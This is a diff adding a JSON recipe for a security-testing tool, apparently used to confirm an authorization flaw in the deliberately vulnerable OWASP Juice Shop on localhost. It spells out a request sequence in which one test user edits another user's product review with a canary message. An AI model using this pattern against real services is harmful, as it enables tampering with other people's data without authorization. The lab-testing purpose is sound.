@@ -1,0 +1,15 @@
+{
+  "_comment": "Witness the OWASP Juice Shop 'edit another user's review' write-IDOR. Register two users first (POST /api/Users with email+password+passwordRepeat+securityQuestion+securityAnswer), set their creds below, then: python idoracle/witness_tool.py --recipe recipes/juiceshop-review-bola.json",
+  "base": "http://127.0.0.1:3000",
+  "auth": {
+    "login_path": "/rest/user/login", "token_json_path": "authentication.token", "scheme": "Bearer ",
+    "users": {
+      "A": {"email": "userA@test.local", "password": "Password1!"},
+      "B": {"email": "userB@test.local", "password": "Password1!"}
+    }
+  },
+  "plant":   {"method": "PUT",   "path": "/rest/products/1/reviews", "principal": "A", "body": {"message": "original by A", "author": "<A.email>"}},
+  "locate":  {"method": "GET",   "path": "/rest/products/1/reviews", "principal": "A", "collection_json_path": "data", "match": {"author": "<A.email>"}, "id_field": "_id"},
+  "attack":  {"method": "PATCH", "path": "/rest/products/reviews",   "principal": "B", "body": {"id": "<located._id>", "message": "<CANARY>"}},
+  "observe": {"method": "GET",   "path": "/rest/products/1/reviews", "principal": "A", "collection_json_path": "data", "canary_in_field": "message"}
+}
